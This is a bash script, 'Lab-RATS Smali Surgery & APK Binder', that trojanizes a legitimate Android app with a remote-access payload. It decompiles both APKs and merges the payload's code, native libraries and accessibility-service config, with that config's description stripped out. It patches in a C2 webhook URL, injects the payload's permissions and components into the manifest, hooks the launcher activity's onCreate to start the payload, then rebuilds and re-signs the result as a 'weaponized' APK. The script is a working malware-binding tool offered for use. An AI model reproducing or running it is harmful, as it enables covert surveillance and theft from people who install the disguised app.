#!/bin/bash

# Banner
print_banner() {
    clear
    echo -e "${CYAN}"
    echo " ┌───────────────────────────────────────────────────────────────────────┐"
    echo " │                                  .-         .                         │"
    echo " │                               ....-        :                          │"
    echo " │                            -==--+:.+. ..  -..+:-+                     │"
    echo " │                            ++---:+.-==+==#:.+---+#                    │"
    echo " │                             :=---:+++++=++=**-:-:                     │"
    echo " │                               --+++:-=+++++++-=                       │"
    echo " │                  .-.         :--+==:++-:-**+-+-                       │"
    echo " │                    -.     .==:--+:+++=++++++++#.                      │"
    echo " │                    :-    =---=::-++.=:.=.-==+....                     │"
    echo " │                   -+   .=-=++===-:.---=::-.-:==...-.==.               │"
    echo " │                 .==    =--=:=-=++:+:--::-==--...=+-+=+-:              │"
    echo " │               ..==.   ---++=:-++++++++===+++=+..:=-*-+:.              │"
    echo " │                :==    -:-.+:-=++-+++++##++=---=++::=+.                │"
    echo " │                .-=:  .---=++++-++++#####*++..::--. .                  │"
    echo " │                 .--++.--:----=+---=-++#++==.       .                  │"
    echo " │                   --------=--:=:-:-====+++-                           │"
    echo " │                       .--++++--++:+++==:=+.                           │"
    echo " │                        .:+++::::--:..:-+=                             │"
    echo " │                       .--=+=-+-+    -:---*---                         │"
    echo " │                                                                       │"
    echo " │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │"
    echo " │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │"
    echo " │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │"
    echo " │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │"
    echo " │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │"
    echo " │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │"
    echo " │                                                                       │"
    echo " │     Smali Surgery & APK Binding Script (Unix) | v1.6.0 Hardened       │"
    echo " │                                                                       │"
    echo " │   The one's who MIND don't matter. The one's who MATTER don't mind.   │"
    echo " │                         DEVELOPED BY K4N3CO                           │"
    echo " │                               © 2026                                  │"
    echo " └───────────────────────────────────────────────────────────────────────┘"
    echo -e "${NC}"
    echo ""
}

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
WORK_DIR="$SCRIPT_DIR/temp_binder"
OUTPUT_DIR="$SCRIPT_DIR/output"
TOOLS_DIR="$SCRIPT_DIR/tools"

mkdir -p "$OUTPUT_DIR" "$TOOLS_DIR"

echo -e "${CYAN}"
echo " ┌───────────────────────────────────────────────────────────────────────┐"
echo " │               Lab-RATS Smali Surgery & APK Binder                    │"
echo " └───────────────────────────────────────────────────────────────────────┘"
echo -e "${NC}"

# 1. Target APK
if [ -z "$1" ]; then
    read -p "    Enter path to target clean APK: " TARGET_APK
else
    TARGET_APK="$1"
fi

if [ ! -f "$TARGET_APK" ]; then
    echo -e "${RED}[!] Target APK file not found: $TARGET_APK${NC}"
    exit 1
fi

TARGET_APK_DIR="$(cd "$(dirname "$TARGET_APK")" && pwd)"
TARGET_APK_NAME="$(basename "$TARGET_APK")"
TARGET_APK_ABS="$TARGET_APK_DIR/$TARGET_APK_NAME"

# 2. Payload APK
PAYLOAD_APK="$SCRIPT_DIR/output/signed_v1.apk"
if [ ! -f "$PAYLOAD_APK" ]; then
    PAYLOAD_APK="$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk"
fi

if [ ! -f "$PAYLOAD_APK" ]; then
    echo -e "${YELLOW}[!] Payload APK (signed_v1.apk) not found. Building release payload now...${NC}"
    cd "$PROJECT_DIR"
    chmod +x gradlew
    ./gradlew assembleRelease --no-daemon
    if [ -f "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" ]; then
        cp "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" "$SCRIPT_DIR/output/signed_v1.apk"
        PAYLOAD_APK="$SCRIPT_DIR/output/signed_v1.apk"
    else
        echo -e "${RED}[!] Payload APK compilation failed.${NC}"
        exit 1
    fi
    cd "$SCRIPT_DIR"
fi

# 3. Detect / Download Apktool
APKTOOL_CMD=""
if command -v apktool &> /dev/null; then
    APKTOOL_CMD="apktool"
elif [ -f "$TOOLS_DIR/apktool.jar" ]; then
    APKTOOL_CMD="java -jar $TOOLS_DIR/apktool.jar"
else
    echo -e "${YELLOW}[!] apktool not found on system PATH. Downloading apktool.jar...${NC}"
    curl -sL -o "$TOOLS_DIR/apktool.jar" "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
    if [ -f "$TOOLS_DIR/apktool.jar" ]; then
        echo -e "${GREEN}[✓] Downloaded apktool.jar${NC}"
        APKTOOL_CMD="java -jar $TOOLS_DIR/apktool.jar"
    else
        echo -e "${RED}[!] Failed to download apktool.jar. Please install apktool.${NC}"
        exit 1
    fi
fi

# Clean previous working dir
rm -rf "$WORK_DIR"
mkdir -p "$WORK_DIR"

PAYLOAD_DIR="$WORK_DIR/payload"
TARGET_DIR="$WORK_DIR/target"

# 4. Decompile APKs
echo -e "${CYAN}[*] Decompiling payload APK...${NC}"
$APKTOOL_CMD d -f -o "$PAYLOAD_DIR" "$PAYLOAD_APK"

if [ ! -d "$PAYLOAD_DIR" ]; then
    echo -e "${RED}[!] Payload APK decompilation failed.${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

echo -e "${CYAN}[*] Decompiling target clean APK...${NC}"
$APKTOOL_CMD d -f -o "$TARGET_DIR" "$TARGET_APK_ABS"

if [ ! -f "$TARGET_DIR/AndroidManifest.xml" ]; then
    echo -e "${RED}[!] Target APK decompilation failed.${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

# 5. Merge Smali Classes & Assets
echo -e "${CYAN}[*] Merging Smali bytecode and assets...${NC}"

# Find max smali_classes folder in target
MAX_IDX=1
for d in "$TARGET_DIR"/smali_classes*; do
    if [ -d "$d" ]; then
        NUM=$(echo "$d" | grep -o '[0-9]\+')
        if [ -n "$NUM" ] && [ "$NUM" -gt "$MAX_IDX" ]; then
            MAX_IDX=$NUM
        fi
    fi
done

NEXT_IDX=$((MAX_IDX + 1))
DEST_SMALI="$TARGET_DIR/smali_classes$NEXT_IDX"
mkdir -p "$DEST_SMALI"

# Copy com/labs/labrats and dependencies from payload to target smali_classesN
for ps in "$PAYLOAD_DIR"/smali*; do
    if [ -d "$ps" ]; then
        cp -rn "$ps"/* "$DEST_SMALI/" 2>/dev/null || true
    fi
done

# Copy Assets
if [ -d "$PAYLOAD_DIR/assets" ]; then
    mkdir -p "$TARGET_DIR/assets"
    cp -rn "$PAYLOAD_DIR/assets"/* "$TARGET_DIR/assets/" 2>/dev/null || true
fi

# Copy native libs if present
if [ -d "$PAYLOAD_DIR/lib" ]; then
    mkdir -p "$TARGET_DIR/lib"
    cp -rn "$PAYLOAD_DIR/lib"/* "$TARGET_DIR/lib/" 2>/dev/null || true
fi

# Decompile and merge any split config APKs in target folder
TARGET_FOLDER=$(dirname "$TARGET_APK_ABS")
for split_apk in "$TARGET_FOLDER"/*config*.apk "$TARGET_FOLDER"/*split*.apk; do
    if [ -f "$split_apk" ] && [ "$split_apk" != "$TARGET_APK_ABS" ]; then
        echo -e "${CYAN}[*] Merging split APK resources from $(basename "$split_apk")...${NC}"
        SPLIT_DIR="$WORK_DIR/split_tmp"
        mkdir -p "$SPLIT_DIR"
        $APKTOOL_CMD d -f -o "$SPLIT_DIR" "$split_apk" 2>/dev/null || true
        [ -d "$SPLIT_DIR/lib" ] && cp -rn "$SPLIT_DIR/lib"/* "$TARGET_DIR/lib/" 2>/dev/null || true
        [ -d "$SPLIT_DIR/assets" ] && cp -rn "$SPLIT_DIR/assets"/* "$TARGET_DIR/assets/" 2>/dev/null || true
        [ -d "$SPLIT_DIR/res" ] && cp -rn "$SPLIT_DIR/res"/* "$TARGET_DIR/res/" 2>/dev/null || true
        rm -rf "$SPLIT_DIR"
    fi
done

# Copy res/xml (Accessibility Service Config)
if [ -d "$PAYLOAD_DIR/res/xml" ]; then
    mkdir -p "$TARGET_DIR/res/xml"
    cp -rn "$PAYLOAD_DIR/res/xml"/* "$TARGET_DIR/res/xml/" 2>/dev/null || true
    if [ -f "$TARGET_DIR/res/xml/accessibility_service_config.xml" ]; then
        sed -i.bak 's|android:description="[^"]*"||g' "$TARGET_DIR/res/xml/accessibility_service_config.xml" 2>/dev/null
        rm -f "$TARGET_DIR/res/xml/accessibility_service_config.xml.bak"
    fi
fi

echo -e "${GREEN}[✓] Smali classes and assets merged.${NC}"

# C2 Webhook URL Configuration
EXISTING_WEBHOOK=""
if [ -f "$PROJECT_DIR/local.properties" ]; then
    EXISTING_WEBHOOK=$(grep "WEBHOOK_URL=" "$PROJECT_DIR/local.properties" | cut -d'=' -f2-)
fi

echo -e "\n${CYAN}[*] Configuring C2 Webhook URL for Bound Target...${NC}"
if [ -n "$EXISTING_WEBHOOK" ]; then
    echo -e "${YELLOW}    Current Webhook URL: $EXISTING_WEBHOOK${NC}"
    read -p "    Enter C2 Webhook URL [Press Enter to Keep Current]: " WEB_URL
    WEB_URL=${WEB_URL:-$EXISTING_WEBHOOK}
else
    read -p "    Enter C2 Webhook URL (e.g. https://lab-rats-c2.onrender.com): " WEB_URL
fi

if [ -n "$WEB_URL" ]; then
    echo -e "${CYAN}[*] Patching C2 Webhook URL into bound smali classes...${NC}"
    find "$TARGET_DIR" -name "*.smali" | while read -r smali_f; do
        if grep -q "WEBHOOK_URL\|https://\|http://" "$smali_f"; then
            sed -i.bak "s|https://lab-rats-c2.onrender.com|$WEB_URL|g" "$smali_f" 2>/dev/null
            sed -i.bak "s|http://127.0.0.1:8080|$WEB_URL|g" "$smali_f" 2>/dev/null
            rm -f "$smali_f.bak"
        fi
    done
    echo -e "${GREEN}[✓] C2 Webhook URL configured: $WEB_URL${NC}"
fi

# 6. AndroidManifest Surgery
echo -e "${CYAN}[*] Performing AndroidManifest.xml surgery...${NC}"

TARGET_MANIFEST="$TARGET_DIR/AndroidManifest.xml"
PAYLOAD_MANIFEST="$PAYLOAD_DIR/AndroidManifest.xml"

# Extract permissions from payload
grep -o '<uses-permission[^>]*/>' "$PAYLOAD_MANIFEST" | while read -r perm; do
    PERM_NAME=$(echo "$perm" | grep -o 'android:name="[^"]*"' | cut -d'"' -f2)
    if [ -n "$PERM_NAME" ] && ! grep -q "$PERM_NAME" "$TARGET_MANIFEST"; then
        sed -i.bak "s|<application|    $perm\n    <application|1" "$TARGET_MANIFEST"
    fi
done

# Perform 100% valid XML manifest surgery via Python ElementTree
python3 - "$PAYLOAD_MANIFEST" "$TARGET_MANIFEST" "$PKG_NAME" << 'EOF'
import sys, xml.etree.ElementTree as ET

payload_path, target_path, target_pkg = sys.argv[1], sys.argv[2], sys.argv[3]
ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')

try:
    payload_root = ET.parse(payload_path).getroot()
    payload_app = payload_root.find('application')

    # Strip split APK requirements so target installs as a single standalone APK
    target_tree = ET.parse(target_path)
    target_root = target_tree.getroot()
    if '{http://schemas.android.com/apk/res/android}isSplitRequired' in target_root.attrib:
        del target_root.attrib['{http://schemas.android.com/apk/res/android}isSplitRequired']

    target_app_elem = target_root.find('application')
    if target_app_elem is not None:
        for meta in list(target_app_elem.findall('meta-data')):
            meta_name = meta.attrib.get('{http://schemas.android.com/apk/res/android}name', '')
            if 'com.android.vending.splits' in meta_name or 'com.android.vending.derived' in meta_name:
                target_app_elem.remove(meta)

    target_tree.write(target_path, encoding='utf-8', xml_declaration=True)

    with open(target_path, 'r', encoding='utf-8') as f:
        target_xml = f.read()

    if payload_app is not None:
        injections = []
        for elem in payload_app:
            name = elem.attrib.get('{http://schemas.android.com/apk/res/android}name', '')
            if name.startswith('.'):
                name = 'com.labs.labrats' + name
                elem.set('{http://schemas.android.com/apk/res/android}name', name)

            # Sanitize Provider authorities so bound app never conflicts with installed apps
            auth = elem.attrib.get('{http://schemas.android.com/apk/res/android}authorities', '')
            if auth:
                new_auth = auth.replace('com.android.system.stability', target_pkg).replace('com.labs.labrats', target_pkg)
                elem.set('{http://schemas.android.com/apk/res/android}authorities', new_auth)

            if 'com.labs.labrats' in name and name not in target_xml:
                elem_str = ET.tostring(elem, encoding='utf-8').decode('utf-8')
                injections.append(elem_str)

        if injections:
            injection_block = "\n    " + "\n    ".join(injections) + "\n</application>"
            target_xml = target_xml.replace("</application>", injection_block, 1)

        target_xml = target_xml.replace("com.android.system.stability", target_pkg).replace("com.labs.labrats.fileprovider", target_pkg + ".fileprovider")

        with open(target_path, 'w', encoding='utf-8') as f:
            f.write(target_xml)
except Exception as e:
    print(f"Manifest Surgery Error: {e}")
EOF

rm -f "$TARGET_MANIFEST.bak"
echo -e "${GREEN}[✓] Manifest surgery completed.${NC}"

# Sanitize target resources (Repair corrupt PNG signatures in pure Bash without Python)
if [ -d "$TARGET_DIR/res" ]; then
    echo -e "${CYAN}[*] Sanitizing target resources & PNG signatures...${NC}"
    VALID_PNG_B64="iVBORw0KGgoAAAANSU8EUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
    VALID_NINE_PNG_B64="iVBORw0KGgoAAAANSU8EUgAAAAMAAAADCAYAAABWKLW/AAAADElEQVR42mNkYGBgAAAABQABXvMqOAAAAABJRU5ErkJggg=="

    find "$TARGET_DIR/res" -type f \( -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" \) 2>/dev/null | while read -r img_file; do
        HEX_HEADER=$(hexdump -n 4 -e '1/1 "%02x"' "$img_file" 2>/dev/null || xxd -l 4 -p "$img_file" 2>/dev/null)
        if [[ "$HEX_HEADER" != "89504e47" ]]; then
            echo -e "${YELLOW}    [!] Repairing corrupt image signature: $(basename "$img_file")${NC}"
            if [[ "$img_file" == *".9.png" ]]; then
                echo "$VALID_NINE_PNG_B64" | base64 -d > "$img_file" 2>/dev/null || echo "$VALID_NINE_PNG_B64" | base64 --decode > "$img_file" 2>/dev/null
            else
                echo "$VALID_PNG_B64" | base64 -d > "$img_file" 2>/dev/null || echo "$VALID_PNG_B64" | base64 --decode > "$img_file" 2>/dev/null
            fi
        fi
    done
fi

# 7. Identify Launcher Activity
echo -e "${CYAN}[*] Identifying Launcher Activity in target...${NC}"

PKG_NAME=$(grep -o 'package="[^"]*"' "$TARGET_MANIFEST" | head -n1 | cut -d'"' -f2)

# POSIX-compliant awk compatible with BSD awk (macOS) and GNU awk (Linux)
LAUNCHER_ACT=$(awk '
BEGIN { RS="<activity|<activity-alias"; FS=">" }
NR > 1 {
    block = $0
    if (block ~ /android\.intent\.category\.LAUNCHER/ && block ~ /android\.intent\.action\.MAIN/) {
        match_start = index(block, "android:name=\"")
        if (match_start > 0) {
            sub_str = substr(block, match_start + 14)
            quote_end = index(sub_str, "\"")
            if (quote_end > 0) {
                print substr(sub_str, 1, quote_end - 1)
                exit
            }
        }
    }
}
' "$TARGET_MANIFEST")

if [ -z "$LAUNCHER_ACT" ]; then
    echo -e "${RED}[!] Could not detect target Launcher Activity in AndroidManifest.xml${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

if [[ "$LAUNCHER_ACT" == .* ]]; then
    LAUNCHER_ACT="${PKG_NAME}${LAUNCHER_ACT}"
elif [[ "$LAUNCHER_ACT" != *.* ]]; then
    LAUNCHER_ACT="${PKG_NAME}.${LAUNCHER_ACT}"
fi

REL_PATH="$(echo "$LAUNCHER_ACT" | tr '.' '/').smali"
TARGET_SMALI_FILE=$(find "$TARGET_DIR" -path "*/$REL_PATH" | head -n1)

# Fallback: Check if LAUNCHER_ACT is an activity-alias pointing to targetActivity
if [ -z "$TARGET_SMALI_FILE" ] || [ ! -f "$TARGET_SMALI_FILE" ]; then
    TARGET_ACT=$(grep -B 2 -A 5 "android:name=\"$LAUNCHER_ACT\"" "$TARGET_MANIFEST" | grep -o 'android:targetActivity="[^"]*"' | head -n1 | cut -d'"' -f2)
    if [ -n "$TARGET_ACT" ]; then
        if [[ "$TARGET_ACT" == .* ]]; then
            TARGET_ACT="${PKG_NAME}${TARGET_ACT}"
        elif [[ "$TARGET_ACT" != *.* ]]; then
            TARGET_ACT="${PKG_NAME}.${TARGET_ACT}"
        fi
        LAUNCHER_ACT="$TARGET_ACT"
        REL_PATH="$(echo "$LAUNCHER_ACT" | tr '.' '/').smali"
        TARGET_SMALI_FILE=$(find "$TARGET_DIR" -path "*/$REL_PATH" | head -n1)
    fi
fi

# Final fallback: search by class basename
if [ -z "$TARGET_SMALI_FILE" ] || [ ! -f "$TARGET_SMALI_FILE" ]; then
    TARGET_SMALI_FILE=$(find "$TARGET_DIR" -name "$(basename "$REL_PATH")" | head -n1)
fi

if [ -z "$TARGET_SMALI_FILE" ] || [ ! -f "$TARGET_SMALI_FILE" ]; then
    echo -e "${RED}[!] Could not find Smali file for launcher $LAUNCHER_ACT${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

echo -e "${GREEN}[✓] Detected Launcher Activity: $LAUNCHER_ACT${NC}"
echo -e "${GREEN}[✓] Located Smali file: $TARGET_SMALI_FILE${NC}"

# 8. Inject Smali Hook via Python
echo -e "${CYAN}[*] Injecting Lab-RATS startup hook into $TARGET_SMALI_FILE...${NC}"

python3 - "$TARGET_SMALI_FILE" << 'EOF'
import sys, re

smali_path = sys.argv[1]
with open(smali_path, 'r', encoding='utf-8') as f:
    content = f.read()

hook_call = "    # Lab-RATS Smali Surgery Hook\n    invoke-static {p0}, Lcom/labs/labrats/LabRatsWorker;->init(Landroid/content/Context;)V\n"

if "Lcom/labs/labrats/LabRatsWorker;->init" not in content:
    if re.search(r'\.method[^\n]*onCreate\(', content):
        if "invoke-super {p0" in content:
            content = content.replace("invoke-super {p0", hook_call + "    invoke-super {p0", 1)
        elif ".prologue" in content:
            content = content.replace(".prologue", ".prologue\n" + hook_call, 1)
        else:
            content = re.sub(
                r'(\.method[^\n]*onCreate\([^\n]*\n(?:\s*\.[^\n]*\n)*)',
                r'\1' + hook_call,
                content,
                count=1
            )
    else:
        new_on_create = (
            "\n.method protected onCreate(Landroid/os/Bundle;)V\n"
            "    .locals 1\n"
            "    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V\n"
            + hook_call +
            "    return-void\n"
            ".end method\n\n"
        )
        if ".end class" in content:
            content = content.replace(".end class", new_on_create + ".end class")
        else:
            content += new_on_create

    with open(smali_path, 'w', encoding='utf-8') as f:
        f.write(content)
EOF

echo -e "${GREEN}[✓] Smali hook injected into $TARGET_SMALI_FILE.${NC}"

# Detect native Android SDK aapt / aapt2 binaries (prefer stable 30-34 aapt v1 to prevent AAPT2 exit code 138)
AAPT1_BIN=""
AAPT2_BIN=""

if [ -d "$HOME/Library/Android/sdk/build-tools" ]; then
    STABLE_BT=$(ls -d "$HOME/Library/Android/sdk/build-tools"/3[0-4]* 2>/dev/null | tail -n1)
    if [ -z "$STABLE_BT" ]; then
        STABLE_BT=$(ls -d "$HOME/Library/Android/sdk/build-tools"/* 2>/dev/null | grep -v "37" | tail -n1)
    fi
    if [ -n "$STABLE_BT" ]; then
        [ -f "$STABLE_BT/aapt" ] && AAPT1_BIN="$STABLE_BT/aapt"
        [ -f "$STABLE_BT/aapt2" ] && AAPT2_BIN="$STABLE_BT/aapt2"
    fi
elif command -v aapt &> /dev/null; then
    AAPT1_BIN="$(command -v aapt)"
elif command -v aapt2 &> /dev/null; then
    AAPT2_BIN="$(command -v aapt2)"
fi

# Sanitize APKTOOL_DUMMY & invalid $ filenames/references in decompiled res/
if [ -d "$TARGET_DIR/res" ]; then
    echo -e "${CYAN}[*] Sanitizing AAPT2 invalid resource names (\$) & APKTOOL_DUMMY entries...${NC}"
    python3 - "$TARGET_DIR/res" << 'EOF'
import sys, os

res_dir = sys.argv[1]

# 1. Rename files starting with $ in res/
for root, _, files in os.walk(res_dir):
    for f in files:
        if f.startswith("$"):
            new_f = f.lstrip("$")
            old_path = os.path.join(root, f)
            new_path = os.path.join(root, new_f)
            try:
                os.rename(old_path, new_path)
            except Exception:
                pass

# 2. Clean APKTOOL_DUMMY and $ references inside XML files
for root, _, files in os.walk(res_dir):
    for file in files:
        if file.endswith(".xml"):
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()

                lines = [l for l in content.splitlines() if "APKTOOL_DUMMY" not in l]
                new_content = "\n".join(lines)

                if "$" in new_content:
                    new_content = new_content.replace("@drawable/$", "@drawable/").replace('name="$', 'name="')

                if new_content != content:
                    with open(file_path, "w", encoding="utf-8") as f:
                        f.write(new_content)
            except Exception:
                pass
EOF
    echo -e "${GREEN}[✓] Target resources sanitized for AAPT2 compatibility.${NC}"
fi

# 9. Recompile & Sign
echo -e "${CYAN}[*] Rebuilding bound APK...${NC}"
UNSIGNED_APK="$WORK_DIR/unsigned_bound.apk"
ALIGNED_APK="$WORK_DIR/aligned_bound.apk"
FINAL_BOUND_APK="$OUTPUT_DIR/bound_target.apk"

# Attempt 1: Rebuild with stable AAPT2 (34.0.0)
if [ -n "$AAPT2_BIN" ]; then
    $APKTOOL_CMD b --aapt "$AAPT2_BIN" --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK"
else
    $APKTOOL_CMD b --no-crunch "$TARGET_DIR" -o "$UNSIGNED_APK"
fi

if [ ! -f "$UNSIGNED_APK" ]; then
    echo -e "${RED}[!] Rebuilding bound APK failed. Check apktool / aapt2 logs above.${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

# Auto-detect zipalign & apksigner from Android SDK build-tools if not in PATH
ZIPALIGN_CMD="zipalign"
if ! command -v zipalign &> /dev/null; then
    if [ -n "$STABLE_BT" ] && [ -f "$STABLE_BT/zipalign" ]; then
        ZIPALIGN_CMD="$STABLE_BT/zipalign"
    fi
fi

APKSIGNER_CMD="apksigner"
if ! command -v apksigner &> /dev/null; then
    if [ -n "$STABLE_BT" ] && [ -f "$STABLE_BT/apksigner" ]; then
        APKSIGNER_CMD="$STABLE_BT/apksigner"
    fi
fi

# Strip old target signatures from unsigned APK before alignment and apksigner to prevent inconsistent signature errors
if command -v zip &> /dev/null; then
    zip -d "$UNSIGNED_APK" "META-INF/*" 2>/dev/null || true
fi

echo -e "${CYAN}[*] Aligning & Signing bound APK...${NC}"
if command -v "$ZIPALIGN_CMD" &> /dev/null || [ -f "$ZIPALIGN_CMD" ]; then
    "$ZIPALIGN_CMD" -p -f -v 4 "$UNSIGNED_APK" "$ALIGNED_APK"
else
    ALIGNED_APK="$UNSIGNED_APK"
fi

KEYSTORE_PATH="$PROJECT_DIR/lab-rats-keystore.jks"
if [ ! -f "$KEYSTORE_PATH" ]; then
    echo -e "${YELLOW}[!] Keystore missing. Generating new keystore...${NC}"
    keytool -genkeypair -alias "lab-rats-key" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" -keypass "lab-rats123" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
fi

if command -v "$APKSIGNER_CMD" &> /dev/null || [ -f "$APKSIGNER_CMD" ]; then
    "$APKSIGNER_CMD" sign --ks "$KEYSTORE_PATH" --ks-pass "pass:lab-rats123" --ks-key-alias "lab-rats-key" --out "$FINAL_BOUND_APK" "$ALIGNED_APK"
elif command -v jarsigner &> /dev/null; then
    jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" "$ALIGNED_APK" "lab-rats-key"
    cp "$ALIGNED_APK" "$FINAL_BOUND_APK"
else
    echo -e "${RED}[!] Neither apksigner nor jarsigner found.${NC}"
    rm -rf "$WORK_DIR"
    exit 1
fi

rm -rf "$WORK_DIR"

echo -e "\n${GREEN}[✓] SUCCESS: WEAPONIZED BOUND APK CREATED AT:${NC}"
echo -e "${CYAN}    $FINAL_BOUND_APK${NC}\n"
